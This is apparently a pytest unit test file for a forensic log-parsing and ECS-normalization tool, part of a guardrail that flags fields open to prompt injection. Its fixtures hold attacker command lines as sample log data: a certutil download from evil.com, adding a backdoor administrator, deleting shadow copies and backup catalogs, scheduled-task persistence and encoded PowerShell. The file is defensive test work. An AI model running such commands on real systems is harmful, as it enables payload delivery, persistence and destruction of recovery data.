"""Comprehensive unit tests for modular forensic parsers and ECS normalization."""

import json
import os
import struct
import tempfile
import pytest

from src.config import Config
from src.parsers.base_parser import BaseForensicParser
from src.parsers.csv_parser import CSVStreamingParser
from src.parsers.ecs_normalizer import ECSNormalizer
from src.parsers.evtx_parser import EVTXStreamingParser
from src.parsers.factory import ParserFactory, load_forensic_data
from src.parsers.json_parser import JSONStreamingParser
from src.parsers.xml_parser import XMLStreamingParser
from src.pipeline import extract_high_risk_fields, load_real_data

# ============================================================================
# 1. ECS Normalizer Tests
# ============================================================================


def test_ecs_normalizer_field_mapping():
    """Verify that disparate forensic fields map correctly to standard ECS keys."""
    normalizer = ECSNormalizer()

    # Raw artifact simulating Sysmon / Windows Event Log 4688
    raw_event = {
        "CommandLine": "powershell.exe -NoP -enc SQBYAEUAWA==",
        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "OriginalFileName": "PowerShell.EXE",
        "ParentCommandLine": "cmd.exe /c start_script.bat",
        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
        "TargetFilename": "C:\\Users\\Public\\malware.exe",
        "FileDescription": "Windows PowerShell Command Line Utility",
        "Message": "A new process has been created.",
        "User": "DOMAIN\\Administrator",
        "Computer": "WORKSTATION-01",
        "UnmappedCustomMetadata": "SpecialInvestigatorValue42",
        "labels": {"source": "kape_triage"},
    }

    ecs = normalizer.normalize(raw_event)

    # Dotted standard keys
    assert ecs["process.command_line"] == "powershell.exe -NoP -enc SQBYAEUAWA=="
    assert (
        ecs["process.executable"]
        == "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    )
    assert ecs["process.name"] == "PowerShell.EXE"
    assert ecs["process.parent.command_line"] == "cmd.exe /c start_script.bat"
    assert ecs["process.parent.executable"] == "C:\\Windows\\System32\\cmd.exe"
    assert ecs["file.path"] == "C:\\Users\\Public\\malware.exe"
    assert ecs["file.description"] == "Windows PowerShell Command Line Utility"
    assert ecs["message"] == "A new process has been created."
    assert ecs["user.name"] == "DOMAIN\\Administrator"
    assert ecs["host.name"] == "WORKSTATION-01"
    assert "event.original" in ecs

    # Nested structures for interoperability
    assert ecs["process"]["command_line"] == ecs["process.command_line"]
    assert (
        ecs["process"]["parent"]["command_line"] == ecs["process.parent.command_line"]
    )
    assert ecs["file"]["path"] == ecs["file.path"]
    assert ecs["user"]["name"] == ecs["user.name"]
    assert ecs["host"]["name"] == ecs["host.name"]

    # Backward compatibility: unmapped fields preserved in custom/labels without data loss
    assert ecs["custom"]["UnmappedCustomMetadata"] == "SpecialInvestigatorValue42"
    assert ecs["labels"]["source"] == "kape_triage"


def test_ecs_normalizer_nested_eventdata():
    """Verify normalizer properly flattens and normalizes Windows EventData structures."""
    normalizer = ECSNormalizer()
    raw_event = {
        "System": {
            "EventID": "4688",
            "Computer": "SRV-DC01",
        },
        "EventData": {
            "NewProcessName": "C:\\Windows\\System32\\whoami.exe",
            "CommandLine": "whoami /all",
            "SubjectUserName": "SYSTEM",
        },
    }

    ecs = normalizer.normalize(raw_event)
    assert ecs["process.command_line"] == "whoami /all"
    assert ecs["process.executable"] == "C:\\Windows\\System32\\whoami.exe"
    assert ecs["user.name"] == "SYSTEM"
    assert ecs["host.name"] == "SRV-DC01"


def test_ecs_normalizer_extract_high_risk():
    """Verify extract_high_risk_ecs extracts only fields inspectable for prompt injection."""
    normalizer = ECSNormalizer()
    ecs_record = {
        "process.command_line": "powershell.exe -Command Write-Host 'Safe'",
        "process.executable": "C:\\Windows\\System32\\powershell.exe",
        "file.description": "PowerShell",
        "host.name": "DESKTOP-999",  # Low risk: Should NOT be in high risk inspectable output
        "user.name": "Alice",  # Low risk
        "custom": {
            "payload_data": "base64EncodedInjectionPayload",
            "timestamp": "2026-10-25T00:00:00Z",
        },
    }

    high_risk = normalizer.extract_high_risk_ecs(ecs_record)

    assert "process.command_line" in high_risk
    assert "process.executable" in high_risk
    assert "file.description" in high_risk
    assert "custom.payload_data" in high_risk
    assert "host.name" not in high_risk
    assert "user.name" not in high_risk
    assert "custom.timestamp" not in high_risk


# ============================================================================
# 2. JSON & JSONL Streaming Parser Tests
# ============================================================================


def test_json_streaming_parser_array(tmp_path):
    """Verify JSONStreamingParser handles streaming top-level JSON arrays."""
    file_path = str(tmp_path / "artifacts_array.json")
    items = [
        {"CommandLine": "cmd.exe /c dir", "User": "admin"},
        {"CommandLine": "powershell.exe -enc AAA=", "User": "guest"},
    ]
    with open(file_path, "w", encoding="utf-8") as f:
        json.dump(items, f)

    parser = JSONStreamingParser()
    parsed = list(parser.parse(file_path))

    assert len(parsed) == 2
    assert parsed[0]["CommandLine"] == "cmd.exe /c dir"
    assert parsed[1]["CommandLine"] == "powershell.exe -enc AAA="


def test_json_streaming_parser_jsonl(tmp_path):
    """Verify JSONStreamingParser streams line-delimited JSON (JSONL/NDJSON)."""
    file_path = str(tmp_path / "events.jsonl")
    lines = [
        {"CommandLine": "net.exe user attacker Pass123 /add"},
        {"CommandLine": "net.exe localgroup administrators attacker /add"},
    ]
    with open(file_path, "w", encoding="utf-8") as f:
        for item in lines:
            f.write(json.dumps(item) + "\n")

    parser = JSONStreamingParser()
    parsed = list(parser.parse(file_path))

    assert len(parsed) == 2
    assert "net.exe user" in parsed[0]["CommandLine"]
    assert "administrators attacker" in parsed[1]["CommandLine"]


def test_json_streaming_parser_single_object(tmp_path):
    """Verify JSONStreamingParser handles a single standalone JSON record object."""
    file_path = str(tmp_path / "single_event.json")
    event = {
        "CommandLine": "rundll32.exe malicious.dll,Run",
        "ExecutablePath": "C:\\Windows\\System32\\rundll32.exe",
    }
    with open(file_path, "w", encoding="utf-8") as f:
        json.dump(event, f)

    parser = JSONStreamingParser()
    parsed = list(parser.parse(file_path))

    assert len(parsed) == 1
    assert parsed[0]["CommandLine"] == "rundll32.exe malicious.dll,Run"


# ============================================================================
# 3. CSV Streaming Parser Tests
# ============================================================================


def test_csv_streaming_parser(tmp_path):
    """Verify CSVStreamingParser parses standard and BOM UTF-8 forensic CSV dumps."""
    file_path = str(tmp_path / "kape_output.csv")
    csv_content = (
        "CommandLine,ExecutablePath,User,Timestamp\n"
        "certutil.exe -urlcache -split -f http://evil.com/x.exe,C:\\Windows\\System32\\certutil.exe,SYSTEM,2026-10-25\n"
        "schtasks.exe /create /tn EvilTask /tr C:\\x.exe /sc daily,C:\\Windows\\System32\\schtasks.exe,SYSTEM,2026-10-25\n"
    )
    with open(file_path, "w", encoding="utf-8-sig") as f:
        f.write(csv_content)

    parser = CSVStreamingParser()
    parsed = list(parser.parse(file_path))

    assert len(parsed) == 2
    assert "certutil.exe" in parsed[0]["CommandLine"]
    assert "schtasks.exe" in parsed[1]["CommandLine"]
    assert parsed[0]["User"] == "SYSTEM"


# ============================================================================
# 4. XML Streaming Parser Tests
# ============================================================================


def test_xml_streaming_parser_windows_events(tmp_path):
    """Verify XMLStreamingParser streams Windows Event XML using iterparse."""
    file_path = str(tmp_path / "sysmon_events.xml")
    xml_content = """<?xml version="1.0" encoding="utf-8"?>
<Events xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <Event>
        <System>
            <Provider Name="Microsoft-Windows-Sysmon" />
            <EventID>1</EventID>
            <Computer>CORP-WKSTN-5</Computer>
        </System>
        <EventData>
            <Data Name="Image">C:\\Windows\\System32\\vssadmin.exe</Data>
            <Data Name="CommandLine">vssadmin.exe delete shadows /all /quiet</Data>
            <Data Name="User">NT AUTHORITY\\SYSTEM</Data>
        </EventData>
    </Event>
    <Event>
        <System>
            <Provider Name="Microsoft-Windows-Sysmon" />
            <EventID>1</EventID>
            <Computer>CORP-WKSTN-5</Computer>
        </System>
        <EventData>
            <Data Name="Image">C:\\Windows\\System32\\wbadmin.exe</Data>
            <Data Name="CommandLine">wbadmin.exe delete catalog -quiet</Data>
            <Data Name="User">NT AUTHORITY\\SYSTEM</Data>
        </EventData>
    </Event>
</Events>
"""
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(xml_content)

    parser = XMLStreamingParser()
    parsed = list(parser.parse(file_path))

    assert len(parsed) == 2
    assert parsed[0]["CommandLine"] == "vssadmin.exe delete shadows /all /quiet"
    assert parsed[0]["Image"] == "C:\\Windows\\System32\\vssadmin.exe"
    assert parsed[1]["CommandLine"] == "wbadmin.exe delete catalog -quiet"


# ============================================================================
# 5. EVTX Parser Tests
# ============================================================================


def test_evtx_streaming_parser_binary_fallback(tmp_path):
    """Verify EVTXStreamingParser correctly parses binary EVTX chunk structures."""
    file_path = str(tmp_path / "Security.evtx")

    # Construct mock binary EVTX:
    # Header: 4096 bytes starting with b'ElfFile\x00'
    header = b"ElfFile\x00" + b"\x00" * 4088

    # Chunk: 65536 bytes
    # Embedded Event record with magic 0x00002a2a
    record_magic = b"\x2a\x2a\x00\x00"
    command_str = b"powershell.exe -encodedCommand Inject123"
    rec_body = b"ExtraBinaryData" + command_str + b"\x00"
    rec_len = 24 + len(rec_body)
    rec_id = 101

    rec_header = (
        record_magic
        + struct.pack("<I", rec_len)
        + struct.pack("<Q", rec_id)
        + struct.pack("<Q", 0)
    )
    record_bytes = rec_header + rec_body

    chunk = b"ElfChnk\x00" + b"\x00" * 504 + record_bytes
    chunk = chunk.ljust(65536, b"\x00")

    with open(file_path, "wb") as f:
        f.write(header + chunk)

    parser = EVTXStreamingParser()
    parsed = list(parser.parse(file_path))

    assert len(parsed) >= 1
    assert any(
        "powershell.exe" in p.get("process.command_line", "")
        or "powershell.exe" in p.get("event.original", "")
        for p in parsed
    )


def test_evtx_streaming_parser_xml_fallback(tmp_path):
    """Verify EVTXStreamingParser handles XML-exported EVTX dumps seamlessly."""
    file_path = str(tmp_path / "System_Export.evtx")
    xml_content = """<Events>
    <Event>
        <EventData>
            <Data Name="CommandLine">sc.exe config TermService start= auto</Data>
        </EventData>
    </Event>
</Events>"""
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(xml_content)

    parser = EVTXStreamingParser()
    parsed = list(parser.parse(file_path))

    assert len(parsed) == 1
    assert parsed[0]["CommandLine"] == "sc.exe config TermService start= auto"


# ============================================================================
# 6. ParserFactory & Format Detection Tests
# ============================================================================


def test_parser_factory_detection(tmp_path):
    """Verify ParserFactory detects format by extension and magic bytes."""
    # Test extension routing
    assert isinstance(ParserFactory.get_parser("audit.json"), JSONStreamingParser)
    assert isinstance(ParserFactory.get_parser("audit.jsonl"), JSONStreamingParser)
    assert isinstance(ParserFactory.get_parser("dump.csv"), CSVStreamingParser)
    assert isinstance(ParserFactory.get_parser("sysmon.xml"), XMLStreamingParser)
    assert isinstance(ParserFactory.get_parser("Application.evtx"), EVTXStreamingParser)

    # Test magic byte routing for file without extension
    no_ext_evtx = str(tmp_path / "unknown_evtx")
    with open(no_ext_evtx, "wb") as f:
        f.write(b"ElfFile\x00" + b"\x00" * 64)
    assert isinstance(ParserFactory.get_parser(no_ext_evtx), EVTXStreamingParser)

    no_ext_xml = str(tmp_path / "unknown_xml")
    with open(no_ext_xml, "w", encoding="utf-8") as f:
        f.write("<Events><Event></Event></Events>")
    assert isinstance(ParserFactory.get_parser(no_ext_xml), XMLStreamingParser)

    no_ext_json = str(tmp_path / "unknown_json")
    with open(no_ext_json, "w", encoding="utf-8") as f:
        f.write('[{"cmd": "whoami"}]')
    assert isinstance(ParserFactory.get_parser(no_ext_json), JSONStreamingParser)

    # Test unsupported file
    unsupported = str(tmp_path / "binary.bin")
    with open(unsupported, "wb") as f:
        f.write(b"\x7fELF\x02\x01\x01\x00")
    with pytest.raises(ValueError, match="Unsupported forensic artifact format"):
        ParserFactory.get_parser(unsupported)


# ============================================================================
# 7. Unified Ingestion & Directory Traversal Tests
# ============================================================================


def test_load_forensic_data_mixed_directory(tmp_path):
    """Verify load_forensic_data recursively parses mixed multi-format files in a directory."""
    # Create JSON file
    f_json = str(tmp_path / "f1.json")
    with open(f_json, "w", encoding="utf-8") as f:
        json.dump([{"CommandLine": "tasklist.exe", "User": "Operator"}], f)

    # Create CSV file
    f_csv = str(tmp_path / "f2.csv")
    with open(f_csv, "w", encoding="utf-8") as f:
        f.write("CommandLine,User\nnetstat.exe -ano,SYSTEM\n")

    # Create XML file
    f_xml = str(tmp_path / "f3.xml")
    with open(f_xml, "w", encoding="utf-8") as f:
        f.write(
            '<Events><Event><EventData><Data Name="CommandLine">ipconfig /all</Data></EventData></Event></Events>'
        )

    items = list(load_forensic_data(str(tmp_path)))

    assert len(items) == 3
    sources = {item["artifact_source"] for item in items}
    assert "f1.json" in sources
    assert "f2.csv" in sources
    assert "f3.xml" in sources

    for item in items:
        assert "id" in item
        assert "content" in item
        assert "ecs" in item
        assert "process.command_line" in item["content"]


# ============================================================================
# 8. Memory Limit & Size Guard Tests
# ============================================================================


def test_max_file_size_limit_skipped(tmp_path, caplog):
    """Verify parser rejects oversized files to protect against memory exhaustion."""
    oversized_file = str(tmp_path / "huge_events.json")
    with open(oversized_file, "wb") as f:
        # Write 2MB of dummy data
        f.write(b" " * (2 * 1024 * 1024))

    # Configure max limit to 1MB
    config = Config(max_file_size_mb=1)
    parser = JSONStreamingParser(config=config)

    # get_logger sets propagate=False, so attach caplog's handler directly
    import logging

    base_logger = logging.getLogger("dfir_guardrail.parsers")
    base_logger.addHandler(caplog.handler)
    try:
        records = list(parser.parse(oversized_file))
    finally:
        base_logger.removeHandler(caplog.handler)
    assert len(records) == 0

    # Ensure structured SIEM warning was logged
    assert any("exceeds 1MB limit" in record.message for record in caplog.records)


# ============================================================================
# 9. Pipeline Compatibility Tests
# ============================================================================


def test_pipeline_integration(tmp_path):
    """Verify pipeline functions load_real_data and extract_high_risk_fields work seamlessly."""
    test_file = str(tmp_path / "pipeline_test.json")
    data = [
        {"CommandLine": "powershell.exe -enc TestPayload", "User": "Admin"},
    ]
    with open(test_file, "w", encoding="utf-8") as f:
        json.dump(data, f)

    # Test load_real_data with directory
    dataset = load_real_data(str(tmp_path))
    assert len(dataset) == 1
    assert (
        dataset[0]["content"]["process.command_line"]
        == "powershell.exe -enc TestPayload"
    )

    # Test load_real_data with single file
    single_dataset = load_real_data(test_file)
    assert len(single_dataset) == 1
    assert (
        single_dataset[0]["content"]["process.command_line"]
        == "powershell.exe -enc TestPayload"
    )

    # Test extract_high_risk_fields
    raw = {"CommandLine": "whoami /priv", "IgnoreMe": "hello"}
    high_risk = extract_high_risk_fields(raw)
    assert high_risk["process.command_line"] == "whoami /priv"
    assert "IgnoreMe" not in high_risk
